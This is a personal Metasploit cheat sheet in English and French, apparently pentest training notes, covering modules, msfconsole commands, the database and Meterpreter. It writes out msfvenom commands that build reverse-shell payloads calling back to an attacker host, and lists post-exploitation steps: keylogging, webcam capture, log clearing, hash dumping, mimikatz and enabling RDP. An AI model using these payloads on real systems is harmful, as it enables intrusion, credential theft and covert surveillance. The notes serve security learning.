# Metasploit 

```bash
msfconsole
```

## Tools :
- msfvenom

## Modules :
(types :  exploits / vulnerability / payloads)

- Auxiliary -> any supporting module : scanners / fuzzers / crawlers
```bash
tree -L 1 auxiliary/ 
```
- Encoder -> encode a payload in hope firewalls dont stop it  
-> detect is based on comparing with known threats DataB liste :
```bash
tree -L 1 encoder/
```
### Evasion: attempt to evade antivirus software (works on encoded pl)
```bash
tree -L 2 evasion/
```
### Exploits 
```bash
tree -L 1 exploits/
```
### NOPs: NOPs (No OPeration) do nothing, literally.
`often used as a buffer to achieve consistent payload sizes`
```bash
tree -L 1 nops/
```
### Post -> post exploitation (end of a pentest)
```bash
tree -L 1 post/
```
### PAYLOADS : The codes that will run on the target system. 
```bash
tree -L 1 payloads/
```
## IMPORTANT : 3 CATEGORIES :
***Singles :*** Self-contained payloads (work alone)  
***Stagers :*** Set up a connection between msf and a the target system / useful when working with staged payloads / Small piece that is sent first. It will download the rest of the payload  
***Stages:*** Downloaded by the stager. This will allow you to use larger sized payloads.  


## Identify inline/single vs staged payloads
`generic/shell_reverse_tcp`	-> _ mean single  
- A single payload is sent all in one connexion  

`windows/x64/shell/reverse_tcp`	-> / mean staged
- A staged payload send a ligher payload and then, curl the rest from the target machine
- Those ones are more used than single payloads


## Basic commands:
```bash
history
```
```bash
help <command>
```
```bash
use Path/to/the_exploit ou nombre apres un search
```
```bash
show options	-> shows selected exploit related options
```
```bash
show payloads ou le type dun module -> module related to the selected exploit
```
```bash
back -> leave context (like exit)
```
```bash
info -> info related to the exploit
```
```bash
search cve number ou exploit name , any key word...
```
```bash
set NAMEOFPARAM
```
```bash
setg NAMEOFPARAM -> global set
```
```bash
unset NAMEOFPARAM ou marche avec unset all
```
```bash
unsetg NAMEOFPARAM
```
```bash
exploit ou run -> lance lexploit
```
- -z flag to run it in bg
```bash
check -> regarde si la target est vulnérable avant de run
```
```bash
backgroung ou CTRL+Z
```
```bash
sessions -> displauys any active sessions
```
- -i session_nb flag to interact with any session

## EXPLOIT PARAMS :
***RHOST:*** target IP (also works with ip/16 and range IP.52-IP.56 to scan a range of ip even with a file.txt (1 IP per line)
***RPORT:*** target port  
***Payload :*** the pl we are using  
***LHOST :*** local host (our ip)  
***LPORT :*** local Port (our port)  
***SESSION :*** Each connection using Metasploit will have a session ID.   
You will use this with post-exploitation modules that will connect to the target system using an existing connection.  
	
## Port scanning :
```bash
search portscan
use x
set params
exploit
```
## PARAMETERS :
- ***CONCURRENCY:*** Number of targets to be scanned simultaneously.
- ***PORTS:*** Port range to be scanned. (1-10 000 by default)
- ***RHOSTS:*** Tager IP
- ***THREADS:*** Number of threads that will be used simultaneously. More threads will result in faster scans. 

### UDP service Identification :
- scanner/discovery/udp_sweep : quick way to identify services such as DNS or NetBIOS. 

### SMB Scans:
- smb_enumshares
- smb_version
	 
## Random useful modules :
- all portscanners modules
- http_version
- smb_login -> bruteforce usernames and passwords in smb
- exploit/multi/handler -> same as netcat for metasploit shells
	
## MSF Database :
`To store informations about targets`

Launching : (it may take 2min to load)
```bash
systemctl start postgresql (in normal shell)
sudo msfdb init (in normal shell)
msfconsole
```
Now in msfconsole :
```bash
db_status
```

In DB (`msfconsole -q`): /!\ -q may save me
### Database management
```bash
workspace -> show available workspace
```
- -a, --add name          Add a workspace.
- -d, --delete name       Delete a workspace.
- -D, --delete-all          Delete all workspaces.
- -h, --help                Help banner.
- -l, --list                List workspaces.
- -r, --rename old new  Rename a workspace.
- -S, --search name     Search for a workspace.
- -v, --list-verbose        List workspaces verbosely.


## Useful things :
`db_nmap` = marche exactement comme nmap mais stocke les data  
`hosts` ->  
- -h -> help  
- -R -> add db value to RHOST parameter  

`services` ->
- -h -> help
- -S serviceName -> search for a specific service
	
***SERVICES INTERSSANTS***  
***HTTP:*** potentially host a  web application with vulnerabilities (SQLi) or  (RCE).  
***FTP:*** Could allow anonymous login   
***SMB:*** Could be vulnerable to SMB exploits like MS17-010  
***SSH:*** Could have default or easy to guess credentials  
***RDP:*** Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.  



## EXPLOIT
```bash
search xxx
info
...
exploit
```

Exploits have a preset payload but we can change it
```bash
show payloads
set payloadnumber (it may add/del parameters)
```

# MSFVENOM : work as msfpayloads and msfencode
## Liste des payloads :
```bash
msfvenom -l payloads
```
## Formats des payloads crées possibles :
```bash
msfvenom --list formats
```
## Example :
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```
| Flag | Meaning |
|-----|---------|
| -p | payload |
|-e | encode format|
|-f | output format (i.e. extension : exe, elf,...)|

## Useful payloads :
### LINUX
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
### WINDOWS :
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```
PHP : (/!\ necessite de modifier le debut avec <?php et la fin avec ?>)
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```
ASP :
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```
PYTHON :
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

# Meterpreter

## Basic Commands
- background: Backgrounds the current session
- exit: Terminate the Meterpreter session
- guid: Get the session GUID (Globally Unique Identifier)
- help: Displays the help menu
- info: Displays information about a Post module
- irb: Opens an interactive Ruby shell on the current session
- load: Loads one or more Meterpreter extensions
- migrate: Allows you to migrate Meterpreter to another process
- run: Executes a Meterpreter script or Post module
- sessions: Quickly switch to another session

## File system commands

- cd: Will change directory
- ls: Will list files in the current directory (dir will also work)
- pwd: Prints the current working directory
- edit: will allow you to edit a file
- cat: Will show the contents of a file to the screen
- rm: Will delete the specified file
- search: Will search for files
- upload: Will upload a file or directory
- download: Will download a file or directory

## Networking commands

- arp: Displays the host ARP (Address Resolution Protocol) cache
- ifconfig: Displays network interfaces available on the target system
- netstat: Displays the network connections
- portfwd: Forwards a local port to a remote service
- route: Allows you to view and modify the routing table

## System commands

- clearev: Clears the event logs
- execute: Executes a command
- getpid: Shows the current process identifier
- getuid: Shows the user that Meterpreter is running as
- kill: Terminates a process
- pkill: Terminates processes by name
- ps: Lists running processes
- reboot: Reboots the remote computer
- shell: Drops into a system command shell
- shutdown: Shuts down the remote computer
- sysinfo: Gets information about the remote system, such as OS

## Others Commands (these will be listed under different menu categories in the help menu)

- idletime: Returns the number of seconds the remote user has been idle
- keyscan_dump: Dumps the keystroke buffer
- keyscan_start: Starts capturing keystrokes
- keyscan_stop: Stops capturing keystrokes
- screenshare: Allows you to watch the remote user's desktop in real time
- screenshot: Grabs a screenshot of the interactive desktop
- record_mic: Records audio from the default microphone for X seconds
- webcam_chat: Starts a video chat
- webcam_list: Lists webcams
- webcam_snap: Takes a snapshot from the specified webcam
- webcam_stream: Plays a video stream from the specified webcam
- getsystem: Attempts to elevate your privilege to that of local system
- hashdump: Dumps the contents of the SAM database

# Post exploitation

## Privilege escalation 
This can be performed in a meterpreter shell
```bash
run post/multi/recon/local_exploit_suggester
```

***Privesc can be accomplished by migrating the current meterpreter shell to a running process with same architecture and rights as LSASS*** (Which is the authentication service in windows)

## Looting

## Mimikatz
Within meterpreter :  
(Note that kiwi is the upgraded version of mimikatz and works as an extension of the current shell i.e. commands are shell written)
```bash
load kiwi
```

## Enable RDP
```bash
run post/windows/manage/enable_rdp
```